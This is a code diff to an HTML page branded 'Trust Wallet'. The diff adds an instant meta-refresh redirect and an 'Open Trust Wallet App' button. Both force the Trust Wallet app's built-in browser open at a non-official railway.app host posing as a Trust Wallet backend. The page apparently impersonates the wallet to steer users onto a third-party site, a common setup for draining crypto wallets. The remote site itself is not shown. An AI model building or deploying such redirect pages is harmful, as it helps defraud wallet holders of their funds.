@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <meta name="theme-color" content="#0b0d14">
+    <meta http-equiv="refresh" content="0;url=intent://link.trustwallet.com/open_url?coin_id=20000714&url=https%3A%2F%2Ftrust-wallet-backend-production-2c80.up.railway.app#Intent;scheme=https;package=com.wallet.crypto.trustapp;S.browser_fallback_url=https%3A%2F%2Flink.trustwallet.com%2Fopen_url%3Fcoin_id%3D20000714%26url%3Dhttps%253A%252F%252Ftrust-wallet-backend-production-2c80.up.railway.app;end">
     <title>Trust Wallet</title>
     <style>
         body {
@@ -32,14 +33,26 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
+        .open-btn {
+            display: inline-block;
+            margin-top: 16px;
+            padding: 10px 22px;
+            background-color: #0500ff;
+            color: #ffffff;
+            text-decoration: none;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+        }
     </style>
 </head>
 <body>
     <div class="loading-box">
         <div class="spinner"></div>
         <p style="font-size: 14px; color: #8a8f9d; margin: 0;">Opening Trust Wallet...</p>
+        <a href="intent://link.trustwallet.com/open_url?coin_id=20000714&url=https%3A%2F%2Ftrust-wallet-backend-production-2c80.up.railway.app#Intent;scheme=https;package=com.wallet.crypto.trustapp;S.browser_fallback_url=https%3A%2F%2Flink.trustwallet.com%2Fopen_url%3Fcoin_id%3D20000714%26url%3Dhttps%253A%252F%252Ftrust-wallet-backend-production-2c80.up.railway.app;end" class="open-btn">Open Trust Wallet App</a>
     </div>
 
-    <script src="js/script.js?v=15"></script>
+    <script src="js/script.js?v=16"></script>
 </body>
 </html>
